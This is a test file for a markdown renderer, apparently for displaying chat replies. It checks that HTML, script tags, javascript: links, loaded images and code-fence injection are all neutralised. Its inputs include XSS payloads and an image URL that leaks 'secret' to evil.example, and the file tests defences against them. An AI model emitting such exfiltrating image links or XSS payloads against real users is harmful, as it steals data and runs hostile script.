import { expect, test } from "bun:test";
import { renderMarkdown } from "./markdown.ts";

test("HTML in a reply is shown as text, not run", () => {
  const html = renderMarkdown('Hi <img src=x onerror="alert(1)"> <script>alert(2)</script>');
  expect(html).not.toContain("<img");
  expect(html).not.toContain("<script");
  expect(html).toContain("&#60;script&#62;");
});

test("links open the web only, in the browser", () => {
  expect(renderMarkdown("[docs](https://example.com)")).toContain(
    '<a href="https://example.com" target="_blank" rel="noreferrer">docs</a>',
  );
  const js = renderMarkdown("[click](javascript:alert(1))");
  expect(js).not.toContain("<a");
  expect(js).toContain("click");
});

test("images aren't loaded: a reply can't send data to a server by naming it in a URL", () => {
  const html = renderMarkdown("![secret](https://evil.example/?q=secret)");
  expect(html).not.toContain("<img");
  expect(html).toContain('<a href="https://evil.example/?q=secret"');
});

test("code blocks are escaped, named and copyable, highlighted or not", async () => {
  const source = '```ts\nconst a = "<b>";\n```';
  // The first render asks for TypeScript and shows the code plain; later ones color it.
  const plain = renderMarkdown(source);
  expect(plain).not.toContain("shiki");
  let html = plain;
  for (let waited = 0; !html.includes("shiki") && waited < 5000; waited += 50) {
    await Bun.sleep(50);
    html = renderMarkdown(source);
  }
  for (const h of [plain, html]) {
    expect(h).not.toContain("<b>");
    expect(h).toContain("<span>ts</span>");
    expect(h).toContain('class="copy"');
  }
  expect(html).toContain("shiki");
  expect(renderMarkdown('```"><script>\nx\n```')).not.toContain("<script>");
});
